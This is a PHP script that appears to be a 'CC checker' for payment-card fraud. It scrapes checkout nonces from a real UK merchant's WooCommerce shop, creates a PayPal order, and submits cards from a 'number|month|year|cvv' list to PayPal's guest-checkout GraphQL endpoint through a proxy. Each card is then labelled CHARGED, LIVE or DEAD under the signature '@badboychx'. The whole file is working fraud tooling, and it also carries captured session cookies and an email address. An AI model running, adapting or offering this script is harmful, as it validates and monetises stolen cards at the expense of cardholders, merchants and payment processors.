<?php 
//error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

// Only set error reporting once
// error_reporting(0);

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}

function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}

$idd = '322580920';

// Check if $lista is set and not null before using it

$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];



$url = 'https://shop.bandai.co.uk/checkout/';
$data = '';
$headers = array(
     'authority: shop.bandai.co.uk',
     'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
     'cookie: _fbp=fb.2.1713232668418.1954890012; _ga=GA1.1.949088680.1713232669; _clck=lcz6ww%7C2%7Cfkz%7C0%7C1567; mailchimp_landing_site=https%3A%2F%2Fshop.bandai.co.uk%2Fbrand%2Fbandai%2Fanime-heroes%2F; wp_woocommerce_session_43cbffee4185ca8280b27c1449f90834=t_5c203174e5dbfad6485e107554ceb1%7C%7C1713405571%7C%7C1713401971%7C%7C938df2ecaabc59314ca184a04562aac7; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-04-16%2002%3A02%3A19%7C%7C%7Cep%3Dhttps%3A%2F%2Fshop.bandai.co.uk%2Fcheckout%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fshop.bandai.co.uk%2Fbasket%2F; sbjs_first_add=fd%3D2024-04-16%2002%3A02%3A19%7C%7C%7Cep%3Dhttps%3A%2F%2Fshop.bandai.co.uk%2Fcheckout%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fshop.bandai.co.uk%2Fbasket%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; woocommerce_items_in_cart=1; woocommerce_cart_hash=986442c9186c59ea42f7f952a32346d8; __cf_bm=1mGXV7pJ4e_V8ruoHmfzg9MbuRoDT2x3IRW9RwrunfQ-1713234749-1.0.1.1-GkBC1M6pFWtNa40IcAbt3rtUf3eSdi_P5DoRKYaAwHy_pQEUbS3lAchpA1__ir.4_JGuXASyam3IM7ZxjjA0ZA; _clsk=zh0fku%7C1713235165562%7C6%7C1%7Ci.clarity.ms%2Fcollect; sbjs_session=pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fshop.bandai.co.uk%2Fbasket%2F; _ga_2PQGTEDRV7=GS1.1.1713234741.2.1.1713235182.0.0.0',
     'referer: https://shop.bandai.co.uk/basket/',
     'sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"',
     'sec-ch-ua-mobile: ?1',
     'sec-ch-ua-platform: "Android"',
     'sec-fetch-dest: document',
     'sec-fetch-mode: navigate',
     'sec-fetch-site: same-origin',
     'sec-fetch-user: ?1',
     'upgrade-insecure-requests: 1',
     'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
);

// Proxy settings

// cURL options
$options = array(
    CURLOPT_URL            => $url,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_CUSTOMREQUEST  => 'POST',
    CURLOPT_POSTFIELDS     => $data,
    CURLOPT_HTTPHEADER     => $headers,
    CURLOPT_PROXY          => $proxy,
    CURLOPT_PROXYUSERPWD   => $proxyAuth,
);

// Initialize cURL session
$ch = curl_init();

// Set cURL options
curl_setopt_array($ch, $options);

// Execute the request
$r1 = curl_exec($ch);
$ononce = trim(strip_tags(getStr($r1, '?wc-ajax=ppc-create-order","nonce":"', '"},'))); 
$nonce = trim(strip_tags(getStr($r1, '<input type="hidden" id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="', '" />'))); 

//////2



$url = 'https://shop.bandai.co.uk/?wc-ajax=ppc-create-order';
$data = '{"nonce":"'.$ononce.'","payer":null,"bn_code":"Woo_PPCP","context":"checkout","order_id":"0","payment_method":"ppcp-gateway","funding_source":"card","form_encoded":"billing_first_name=Badboy&billing_last_name=Chk&billing_email=legendhr75%40gmail.com&billing_country=GB&billing_address_1=New+yark&billing_address_2=8373&billing_city=Delhi&billing_state=California&billing_postcode=S51+6RB&billing_phone=3046278465&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=GB&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fshop.bandai.co.uk%2Fbasket%2F&wc_order_attribution_session_start_time=2024-04-16+01%3A27%3A45&wc_order_attribution_session_pages=7&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+%28Linux%3B+Android+10%3B+K%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F124.0.0.0+Mobile+Safari%2F537.36&shipping_method%5B0%5D=flat_rate%3A1&payment_method=ppcp-gateway&terms=on&terms-field=1&woocommerce-process-checkout-nonce='.$nonce.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ppcp-funding-source=card","createaccount":false,"save_payment_method":false}';
$headers = array(
     'authority: shop.bandai.co.uk',
     'accept: */*',
     'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
     'content-type: application/json',
     'cookie: __cf_bm=urQQYWXVb1hhwYTSdSiFcQJI2j1Jom2K4.2LVqE9cI0-1713232656-1.0.1.1-uVvpzR70DF3O7eLjsCiBnBEKmvLdAh1yNLqNjRZ1gtLAaC2oNrdDf7yis4drToXJ5W2nFHmCghj.x68q9bF2dg; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-04-16%2001%3A27%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fshop.bandai.co.uk%2Fbasket%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-04-16%2001%3A27%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fshop.bandai.co.uk%2Fbasket%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; _fbp=fb.2.1713232668418.1954890012; _ga=GA1.1.949088680.1713232669; _clck=lcz6ww%7C2%7Cfkz%7C0%7C1567; mailchimp_landing_site=https%3A%2F%2Fshop.bandai.co.uk%2Fbrand%2Fbandai%2Fanime-heroes%2F; woocommerce_items_in_cart=1; woocommerce_cart_hash=986442c9186c59ea42f7f952a32346d8; wp_woocommerce_session_43cbffee4185ca8280b27c1449f90834=t_5c203174e5dbfad6485e107554ceb1%7C%7C1713405571%7C%7C1713401971%7C%7C938df2ecaabc59314ca184a04562aac7; sbjs_session=pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fshop.bandai.co.uk%2Fcheckout%2F; _ga_2PQGTEDRV7=GS1.1.1713232669.1.1.1713232811.0.0.0; _clsk=1qxz34a%7C1713232813195%7C7%7C1%7Cj.clarity.ms%2Fcollect',
     'origin: https://shop.bandai.co.uk',
     'referer: https://shop.bandai.co.uk/checkout/',
     'sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"',
     'sec-ch-ua-mobile: ?1',
     'sec-ch-ua-platform: "Android"',
     'sec-fetch-dest: empty',
     'sec-fetch-mode: cors',
     'sec-fetch-site: same-origin',
     'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
);

// Proxy settings

// cURL options
$options = array(
    CURLOPT_URL            => $url,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_CUSTOMREQUEST  => 'POST',
    CURLOPT_POSTFIELDS     => $data,
    CURLOPT_HTTPHEADER     => $headers,
    CURLOPT_PROXY          => $proxy,
    CURLOPT_PROXYUSERPWD   => $proxyAuth,
);

// Initialize cURL session
$ch = curl_init();

// Set cURL options
curl_setopt_array($ch, $options);

// Execute the request
$r2 = curl_exec($ch);
$data = json_decode($r2, true);
$token = $data['data']['id'];


$url = 'https://www.paypal.com/graphql?OnboardGuestMutation';
$data = '{"operationName":"OnboardGuestMutation","variables":{"card":{"cardNumber":"'.$cc.'","expirationDate":"'.$mes.'/'.$ano.'","securityCode":"'.$cvv.'","type":"VISA"},"country":"GB","email":"legendhr75@gmail.com","firstName":"Badboy","lastName":"Chk","phone":{"countryCode":"44","number":"3046278465","type":"MOBILE"},"supportedThreeDsExperiences":["IFRAME"],"token":"'.$token.'","billingAddress":{"line1":"5020 GREEN LANE","city":"BATH","state":"CENTRAL","postalCode":"S51 6RB","accountQuality":{"autoCompleteType":"GOOGLE","isUserModified":true,"twoFactorPhoneVerificationId":""},"country":"GB","familyName":"Chk","givenName":"Badboy"},"shippingAddress":{"line1":"New yark","line2":"8373","city":"Delhi","postalCode":"S51 6RB","accountQuality":{"autoCompleteType":"MERCHANT_PREFILLED","isUserModified":false},"country":"GB","familyName":"Chk","givenName":"Badboy"},"crsData":null},"query":"mutation OnboardGuestMutation($bank: BankAccountInput, $billingAddress: AddressInput, $card: CardInput, $country: CountryCodes, $currencyConversionType: CheckoutCurrencyConversionType, $dateOfBirth: DateOfBirth, $email: String, $firstName: String\u0021, $lastName: String\u0021, $phone: PhoneInput, $shareAddressWithDonatee: Boolean, $shippingAddress: AddressInput, $supportedThreeDsExperiences: [ThreeDSPaymentExperience], $token: String\u0021) {\\n  onboardAccount: onboardGuest(\\n    bank: $bank\\n    billingAddress: $billingAddress\\n    card: $card\\n    country: $country\\n    currencyConversionType: $currencyConversionType\\n    dateOfBirth: $dateOfBirth\\n    email: $email\\n    firstName: $firstName\\n    lastName: $lastName\\n    phone: $phone\\n    shareAddressWithDonatee: $shareAddressWithDonatee\\n    shippingAddress: $shippingAddress\\n    token: $token\\n  ) {\\n    buyer {\\n      auth {\\n        accessToken\\n        __typename\\n      }\\n      userId\\n      __typename\\n    }\\n    flags {\\n      is3DSecureRequired\\n      __typename\\n    }\\n    ...fundingOptions\\n    paymentContingencies {\\n      threeDomainSecure(experiences: $supportedThreeDsExperiences) {\\n        status\\n        redirectUrl {\\n          href\\n          __typename\\n        }\\n        method\\n        parameter\\n        experience\\n        requestParams {\\n          key\\n          value\\n          __typename\\n        }\\n        __typename\\n      }\\n      ...threeDSContingencyData\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\\nfragment fundingOptions on CheckoutSession {\\n  fundingOptions {\\n    allPlans {\\n      fundingSources {\\n        fundingInstrument {\\n          id\\n          __typename\\n        }\\n        amount {\\n          currencyCode\\n          currencyValue\\n          __typename\\n        }\\n        __typename\\n      }\\n      __typename\\n    }\\n    fundingInstrument {\\n      id\\n      lastDigits\\n      name\\n      nameDescription\\n      type\\n      __typename\\n    }\\n    __typename\\n  }\\n  __typename\\n}\\n\\nfragment threeDSContingencyData on PaymentContingencies {\\n  threeDSContingencyData {\\n    name\\n    causeName\\n    resolution {\\n      type\\n      resolutionName\\n      paymentCard {\\n        billingAddress {\\n          line1\\n          line2\\n          city\\n          state\\n          country\\n          postalCode\\n          __typename\\n        }\\n        expireYear\\n        expireMonth\\n        currencyCode\\n        cardProductClass\\n        id\\n        encryptedNumber\\n        type\\n        number\\n        bankIdentificationNumber\\n        __typename\\n      }\\n      contingencyContext {\\n        deviceDataCollectionUrl {\\n          href\\n          __typename\\n        }\\n        jwtSpecification {\\n          jwtDuration\\n          jwtIssuer\\n          jwtOrgUnitId\\n          type\\n          __typename\\n        }\\n        reason\\n        referenceId\\n        source\\n        __typename\\n      }\\n      __typename\\n    }\\n    __typename\\n  }\\n  __typename\\n}\\n"}';
$headers = array(
     'authority: www.paypal.com',
     'accept: */*',
     'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
     'content-type: application/json',
     'cookie: cookie_prefs=T%3D1%2CP%3D1%2CF%3D1%2Ctype%3Dexplicit_banner; _gcl_au=1.1.1704046129.1701966414; TLTDID=20704593514153002103048259251319; sc_f=8d0SPR2SvzLC9pWx4vS7fznZkaQFKxMoaqisq-gXTnz5RaYhTeBbErhGxw1Vvp1cSQ1N2DO_dMGgLzgiWA9D-me_MMDiojSOpJCcz0; KHcl0EuY7AKSMgfvHl7J5E7hPtK=pcNun_sc9GQdIXUmn7s2cFcvN9oiqjThkm9LvUA5rBr5seBMGlrUf_LnyJYPxnXMY_0vAidU-8W2fbZF; cookie_check=yes; d_id=1712401455225; _ga_12GGBZX842=GS1.1.1712401295.12.1.1712401471.0.0.0; rmuc=qiDOo6yiZSu7gD1BtMWHQuIxyRL5nqJ9FKUsw0CDrPQsZ6-nkSIDgmVikXw2sSPMQ2yudfAejT0DdC22x54wAbeO1nsbg2xMXBCaUwtZO11yCn-5_3aUBKJjGARsoj_p4UAs-G; _gid=GA1.2.1762167772.1713111402; consumer_display=USER_HOMEPAGE%3d0%26USER_TARGETPAGE%3d0%26USER_FILTER_CHOICE%3d0%26BALANCE_MODULE_STATE%3d1%26GIFT_BALANCE_MODULE_STATE%3d1%26LAST_SELECTED_ALIAS_ID%3d0%26SELLING_GROUP%3d1%26PAYMENT_AND_RISK_GROUP%3d1%26SHIPPING_GROUP%3d1%26HOME_VERSION%3d1713240589%26MCE2_ELIGIBILITY%3d4294967295; navlns=0.0; enforce_policy=gdpr_v2.1; LANG=en_GB%3BIN; ts_c=vr%3D67efa4871860a1d60a044521f9b157ae%26vt%3De49f8e3418e0aa30c414ec6dfeb28c5f; l7_az=dcg16.slc; TLTSID=58995263964382885194492752544447; rssk=d%7DC9%4076786%3A%3F6AA%3D%3Exqx%3E%C2%82wm%C2%81hs9l%3F18; login_email=legendhr75%40gmail.com; _ga=GA1.1.691662425.1682574069; _ga_FQYH6BLY4K=GS1.1.1713232972.3.1.1713233076.0.0.0; nsid=s%3Al3OD3HZPAwaYbpJXldfWJZPk0h6hitXO.TXgCJfu1QQrIUUXD%2FASW2I9PmNy4aPFpn0PjH3hSwaw; tsrce=checkoutuinodeweb_weasley; tcs=main%3Axo%3Alite%7Ccss-ltr-19jfsh6%20css-ltr-11pvgxh-button_base-text_button_lg-btn_full_width; x-pp-s=eyJ0IjoiMTcxMzIzMzU4NDQ3NCIsImwiOiIwIiwibSI6IjAifQ; ts=vreXpYrS%3D1807841584%26vteXpYrS%3D1713235384%26vr%3D67efa4871860a1d60a044521f9b157ae%26vt%3De49f8e3418e0aa30c414ec6dfeb28c5f%26vtyp%3Dreturn',
     'origin: https://www.paypal.com',
     'paypal-client-context: '.$token.'',
     'paypal-client-metadata-id: uid_5328cd06b6_mdi6mda6mtu',
     'referer: https://www.paypal.com/checkoutnow?sessionID=uid_5328cd06b6_mdi6mda6mtu&buttonSessionID=uid_ede7a4bb39_mdi6mda6mtu&stickinessID=uid_08ffec806a_mdi6mda6mtu&smokeHash=&sign_out_user=false&token='.$token.'&fundingSource=card&buyerCountry=IN&locale.x=en_IN&commit=true&client-metadata-id=uid_5328cd06b6_mdi6mda6mtu&enableFunding.0=venmo&enableFunding.1=paylater&clientID=AWfa74DI0EskAbLvdMRUxlNnNJw7-mrqb4wRBx_USJd49RvQSVSeJKMAuiDGfGblIRGJPDH_HWjrDtYC&env=production&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVdmYTc0REkwRXNrQWJMdmRNUlV4bE5uTkp3Ny1tcnFiNHdSQnhfVVNKZDQ5UnZRU1ZTZUpLTUF1aURHZkdibElSR0pQREhfSFdqckR0WUMmY3VycmVuY3k9R0JQJmludGVncmF0aW9uLWRhdGU9MjAyNC0wMy0xMiZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb19QUENQIiwiZGF0YS11aWQiOiJ1aWRfZWlnY29taWVjd214aGJma2dzaXpqYnB3YWVlanpzIn19&xcomponent=1&version=5.0.433',
     'sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"',
     'sec-ch-ua-arch: ""',
     'sec-ch-ua-bitness: ""',
     'sec-ch-ua-full-version: "124.0.6327.2"',
     'sec-ch-ua-full-version-list: "Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
     'sec-ch-ua-mobile: ?1',
     'sec-ch-ua-model: "220333QBI"',
     'sec-ch-ua-platform: "Android"',
     'sec-ch-ua-platform-version: "13.0.0"',
     'sec-ch-ua-wow64: ?0',
     'sec-fetch-dest: empty',
     'sec-fetch-mode: cors',
     'sec-fetch-site: same-origin',
     'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
     'x-app-name: checkoutuinodeweb_weasley',
     'x-country: GB',
     'x-locale: en_GB',
     'x-requested-with: fetch',
);

// Proxy settings
$proxy = 'proxy.example.com:8080';
$proxyAuth = 'username:password'; // Replace with your proxy authentication

// cURL options
$options = array(
    CURLOPT_URL            => $url,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_CUSTOMREQUEST  => 'POST',
    CURLOPT_POSTFIELDS     => $data,
    CURLOPT_HTTPHEADER     => $headers,
    CURLOPT_PROXY          => $proxy,
    CURLOPT_PROXYUSERPWD   => $proxyAuth,
);

// Initialize cURL session
$ch = curl_init();

// Set cURL options
curl_setopt_array($ch, $options);

// Execute the request
$r3 = curl_exec($ch);

//$pi = trim(strip_tags(getStr($r1, '"clientSecret":"', '_secret_'))); 



$msg1 = trim(strip_tags(getStr($r3, '"message":"', '",'))); 

$end_time = microtime(true);
  $time = number_format($end_time - $start_time, 2);



    if (
        strpos($r3, 'ADD_SHIPPING_ERROR') ||
        strpos($r3, 'NEED_CREDIT_CARD') ||
        strpos($r3, '"status": "succeeded"') ||
        strpos($r3, 'Thank You For Donation.') ||
        strpos($r3, 'Your payment has already been processed') ||
        strpos($r3, 'Success ') ||
        strpos($r3, '"type":"one-time"') ||
        strpos($r3, '/donations/thank_you?donation_number=')
    ) {
        
        echo "CHARGED</span>  </span>CC: $lista</span>  <br>RESPONSE: CHARGED 22.99$ SUCCESSFULLY 🟢</span><br><span>GATE: PURE PAYPAL 22.99$</span><br><span>BY: @badboychx</span>";
        
    } elseif (strpos($r3, 'INVALID_BILLING_ADDRESS')) {
       echo "LIVE</span>  </span>CC: $lista</span>  <br>RESPONSE: INVALID BILLING ADDRESS</span><br><span>GATE: PURE PAYPAL 1$</span><br><span>BY: @badboychx</span>";
    } elseif (strpos($r3, 'INVALID_SECURITY_CODE')) {
    echo "LIVE</span>  </span>CC: $lista</span>  <br>RESPONSE: INVALID SECURITY COD 🟢</span><br><span>GATE: PURE PAYPAL 1$</span><br><span>BY: @badboychx</span>";
    } elseif (strpos($r3, 'EXISTING_ACCOUNT_RESTRICTED')) {
    echo "LIVE</span>  </span>CC: $lista</span>  <br>RESPONSE: Existing Account Restricted </span><br><span>GATE: PURE PAYPAL 1$</span><br><span>BY: @badboychx</span>";
    } elseif (strpos($r3, 'is3DSecureRequired')) {
    
    echo "LIVE</span>  </span>CC: $lista</span>  <br>RESPONSE: 3D SECURE REQUIRED 🟡</span><br><span>GATE: PURE PAYPAL 1$</span><br><span></span><br><span>BY: @badboychx</span>";
    } elseif (strpos($r3, 'CARD_GENERIC_ERROR')) {
    echo "DEAD</span>  </span>CC: $lista</span>  <br>RESPONSE: ISSUER_DECLINE</span><br><span>GATE: PURE PAYPAL 1$</span><br><span>BY: @badboychx</span>";
    } else {
    echo "DEAD</span>  </span>CC: $lista</span>  <br>RESPONSE: $msg1 </span><br><span>GATE: PURE PAYPAL 1$</span><br><span>BY: @badboychx</span>";
    }
  
curl_close($ch);


ob_flush();